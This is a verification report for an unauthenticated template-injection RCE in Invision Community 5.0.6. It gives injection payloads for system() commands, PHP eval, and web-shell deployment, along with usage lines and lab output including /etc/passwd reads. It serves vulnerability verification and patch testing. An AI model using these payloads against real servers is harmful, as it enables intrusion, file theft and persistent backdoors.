# PoC Verification Report: CVE-2025-47916

## Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-47916 |
| **Vulnerability** | Invision Community <= 5.0.6 — Unauthenticated RCE via Template Injection |
| **Verification Status** | **CONFIRMED** |
| **PoC Scripts** | 3 scripts testing 3 distinct attack vectors |
| **Vulnerable Container** | `cve-2025-47916-vulnerable` — all 3 vectors succeed |
| **Patched Container** | `cve-2025-47916-patched` — all 3 vectors blocked (HTTP 403) |

---

## PoC Scripts

### 1. Primary PoC: `poc.py` — OS Command Execution via system()

| Field | Value |
|---|---|
| **Path** | `poc/poc.py` |
| **Language** | Python 3 (stdlib only — no external dependencies) |
| **Attack Vector** | SSTI → `system()` → OS command execution |
| **Payload** | `{expression="die('________'.system(base64_decode('CMD_B64')))"}` |
| **Features** | Version detection, non-destructive vuln check, command execution, output extraction |

**Usage:**
```bash
python3 poc.py <target_host> [port]                    # Execute 'id' (default)
python3 poc.py <target_host> [port] -c "whoami"        # Execute custom command
python3 poc.py <target_host> [port] --check-only       # Just check vulnerability
```

**Exploit chain:**
1. Version fingerprinting via `/admin/install/eula.txt`
2. Non-destructive template injection check with `{expression="die('CANARY')"}`
3. OS command execution via `{expression="die('________'.system(base64_decode('CMD')))"}` 
4. Output extraction by splitting response on `________` marker

### 2. Vector 2 PoC: `poc_vector2.py` — PHP Eval Payload (Metasploit-style)

| Field | Value |
|---|---|
| **Path** | `poc/poc_vector2.py` |
| **Language** | Python 3 (stdlib only) |
| **Attack Vector** | SSTI → `eval()` → arbitrary PHP code execution |
| **Payload** | `{expression="die('________'.eval(base64_decode('PHP_B64')))"}` |
| **Features** | PHP info disclosure, file read, directory listing, config check |

**Usage:**
```bash
python3 poc_vector2.py <target_host> [port]                          # Run all demos
python3 poc_vector2.py <target_host> [port] --php-code "phpinfo();"  # Custom PHP
```

**Demonstrates:**
- PHP environment disclosure (`php_uname()`, `phpversion()`, `php_sapi_name()`)
- Arbitrary file read (`file_get_contents("/etc/passwd")`)
- Directory listing (`scandir("/var/www/html/")`)
- PHP configuration check (`ini_get("disable_functions")`)

This is a **different exploitation primitive** than Vector 1 — it executes arbitrary PHP code (not just OS commands), matching the Metasploit module's approach.

### 3. Vector 3 PoC: `poc_vector3.py` — Web Shell Deployment via File Write

| Field | Value |
|---|---|
| **Path** | `poc/poc_vector3.py` |
| **Language** | Python 3 (stdlib only) |
| **Attack Vector** | SSTI → `file_put_contents()` → persistent web shell |
| **Payload** | `{expression="die('________'.file_put_contents('PATH', base64_decode('SHELL')))"}` |
| **Features** | Shell deployment, verification, command execution via shell, cleanup |

**Usage:**
```bash
python3 poc_vector3.py <target_host> [port]
```

**Demonstrates:**
1. Writing a PHP web shell to the document root via `file_put_contents()`
2. Accessing the web shell via HTTP GET
3. Executing OS commands through the deployed web shell
4. Cleaning up (deleting) the web shell via `unlink()`

This is a **fundamentally different attack pattern** — instead of extracting one-shot command output from the SSTI response, it establishes a **persistent backdoor** that can be accessed independently of the template injection vulnerability.

---

## Vulnerability Demonstrated

The PoC proves:

1. **Unauthenticated access** — No login, session tokens, CSRF tokens, API keys, or cookies are needed. All requests are completely unauthenticated POST requests.

2. **Server-Side Template Injection** — The `{expression="..."}` IPS template tag is compiled into PHP code and evaluated via `eval()`. Any PHP expression placed inside the tag is executed.

3. **Remote Code Execution** — Three distinct RCE primitives are demonstrated:
   - OS command execution via `system()` (Vector 1)
   - Arbitrary PHP eval via `eval()` (Vector 2)
   - Persistent file write via `file_put_contents()` (Vector 3)

4. **Full system compromise path** — The PoCs demonstrate:
   - OS identity (`uid=33(www-data)`)
   - File system read (`/etc/passwd`)
   - File system write (web shell deployment)
   - PHP environment enumeration
   - All with zero authentication

---

## Test Results

### Vulnerable Container (`cve-2025-47916-vulnerable`)

#### Primary PoC (`poc.py`) — `id` command

```
$ python3 poc/poc.py localhost 8080

[*] CVE-2025-47916: Invision Community <= 5.0.6 Unauthenticated RCE
[*] Target: http://localhost:8080/

[*] Step 1: Checking target version...
[+] Detected version: IPS 5.0.6 (VULNERABLE)

[*] Step 2: Confirming template injection (non-destructive check)...
[+] Template injection CONFIRMED — target is exploitable!

[*] Step 3: Executing command: id
[+] Command executed successfully!
[+] HTTP Status: 200

─── Command Output ───
uid=33(www-data) gid=33(www-data) groups=33(www-data)
──────────────────────

[+] EXPLOITATION SUCCESSFUL — Remote Code Execution confirmed
```

**Exit code:** 0 (success)

#### Primary PoC (`poc.py`) — `uname -a` command

```
$ python3 poc/poc.py localhost 8080 -c "uname -a"

[*] CVE-2025-47916: Invision Community <= 5.0.6 Unauthenticated RCE
[*] Target: http://localhost:8080/

[*] Step 1: Checking target version...
[+] Detected version: IPS 5.0.6 (VULNERABLE)

[*] Step 2: Confirming template injection (non-destructive check)...
[+] Template injection CONFIRMED — target is exploitable!

[*] Step 3: Executing command: uname -a
[+] Command executed successfully!
[+] HTTP Status: 200

─── Command Output ───
Linux 490c12c7f822 6.12.69-linuxkit #1 SMP Mon Feb 16 11:19:06 UTC 2026 aarch64 GNU/Linux
──────────────────────

[+] EXPLOITATION SUCCESSFUL — Remote Code Execution confirmed
```

**Exit code:** 0 (success)

#### Vector 2 (`poc_vector2.py`) — PHP Eval

```
$ python3 poc/poc_vector2.py localhost 8080

[*] CVE-2025-47916: PHP Eval Payload Variant (Metasploit-style)
[*] Target: http://localhost:8080/

[*] Demo 1: PHP environment information (php_uname + phpversion)
[+] PHP eval() succeeded!
OS: Linux 490c12c7f822 6.12.69-linuxkit #1 SMP Mon Feb 16 11:19:06 UTC 2026 aarch64
PHP: 8.2.30
SAPI: apache2handler
User: www-data

[*] Demo 2: Reading /etc/passwd via file_get_contents()
[+] File read successful! (18 lines)
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    ... (13 more lines)

[*] Demo 3: Listing web root via scandir()
[+] Directory listing successful!
    .
    ..
    admin
    index.php

[*] Demo 4: Checking PHP disable_functions
[+] No functions disabled

[+] PHP eval() exploitation CONFIRMED — arbitrary PHP execution achieved
[+] This demonstrates the Metasploit-style payload vector (eval vs system)
```

**Exit code:** 0 (success)

#### Vector 3 (`poc_vector3.py`) — Web Shell Deployment

```
$ python3 poc/poc_vector3.py localhost 8080

[*] CVE-2025-47916: Web Shell Deployment Vector
[*] Target: http://localhost:8080/

[*] Step 1: Writing web shell to /var/www/html/.sfzqpwtv.php
[+] Web shell written successfully

[*] Step 2: Verifying web shell at http://localhost:8080/.sfzqpwtv.php
[+] Web shell is LIVE and responding!

[*] Step 3: Executing 'id && uname -a' through web shell
[+] Command executed via web shell!

--- Web Shell Output ---
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 490c12c7f822 6.12.69-linuxkit #1 SMP Mon Feb 16 11:19:06 UTC 2026 aarch64 GNU/Linux
Linux 490c12c7f822 6.12.69-linuxkit #1 SMP Mon Feb 16 11:19:06 UTC 2026 aarch64 GNU/Linux
------------------------

[*] Step 4: Cleaning up web shell at /var/www/html/.sfzqpwtv.php
[+] Cleanup request sent (HTTP 200)

[*] Step 5: Verifying cleanup...
[+] Web shell removed successfully (404 Not Found)

[+] WEB SHELL DEPLOYMENT CONFIRMED — demonstrates file write + persistence capability
[+] This proves the SSTI can be used for persistent backdoor deployment,
[+] not just one-shot command execution.
```

**Exit code:** 0 (success)

---

### Patched Container (`cve-2025-47916-patched`)

#### Primary PoC vs Patched

```
$ python3 poc/poc.py localhost 8081

[*] CVE-2025-47916: Invision Community <= 5.0.6 Unauthenticated RCE
[*] Target: http://localhost:8081/

[*] Step 1: Checking target version...
[+] Detected version: IPS 5.0.6 (VULNERABLE)

[*] Step 2: Confirming template injection (non-destructive check)...
[-] Template injection check failed — target may not be vulnerable
[-] Aborting.
```

**Exit code:** 1 (blocked — correct behavior)

#### Vector 2 vs Patched

```
$ python3 poc/poc_vector2.py localhost 8081

[*] CVE-2025-47916: PHP Eval Payload Variant (Metasploit-style)
[*] Target: http://localhost:8081/

[*] Demo 1: PHP environment information (php_uname + phpversion)
[-] Demo 1 failed (HTTP 403)
[-] Target appears to be patched
```

**Exit code:** 1 (blocked — correct behavior)

#### Vector 3 vs Patched

```
$ python3 poc/poc_vector3.py localhost 8081

[*] CVE-2025-47916: Web Shell Deployment Vector
[*] Target: http://localhost:8081/

[*] Step 1: Writing web shell to /var/www/html/.xgbpwakg.php
[-] HTTP 403 — target appears patched
```

**Exit code:** 1 (blocked — correct behavior)

---

## Verification Summary

| PoC Script | Vector | Vulnerable | Patched |
|---|---|---|---|
| `poc.py` | OS cmd via `system()` | ✅ **RCE confirmed** | ❌ Blocked (auth check + expression strip) |
| `poc_vector2.py` | PHP code via `eval()` | ✅ **PHP eval confirmed** | ❌ Blocked (HTTP 403) |
| `poc_vector3.py` | File write via `file_put_contents()` | ✅ **Web shell deployed** | ❌ Blocked (HTTP 403) |

### Verification Status: **CONFIRMED**

All three attack vectors succeed on the vulnerable container (IPS 5.0.6) and are blocked by the patch (IPS 5.0.7).

---

## Notes

1. **Zero dependencies**: All three PoC scripts use only Python 3 standard library (`urllib`, `base64`, `argparse`). No `pip install` required.

2. **Version detection caveat**: The patched container's `eula.txt` still reports "IPS 5.0.6" (a known lab artifact). The primary PoC's version check would incorrectly report the patched target as "VULNERABLE" based on the version file, but the subsequent template injection check correctly detects that the endpoint is protected.

3. **Output duplication**: The `system()` function in PHP both echoes output to stdout AND returns it. This means command output appears twice in the response (once from stdout, once from `die()`'s return value). The output extraction correctly handles this by splitting on the `________` marker and taking the first part.

4. **Web shell cleanup**: Vector 3 successfully cleans up after itself by using the same SSTI to `unlink()` the deployed web shell. The 404 verification confirms removal.

5. **Patch effectiveness**: The 5.0.7 patch adds an authentication check that returns HTTP 403 for unauthenticated requests to the `customCss` endpoint. This is effective against all three attack vectors since they all share the same unauthenticated entry point.

6. **Lab environment**: This was tested against a synthetic PHP application that faithfully reproduces the vulnerable code path. The actual Invision Community application is commercial software.
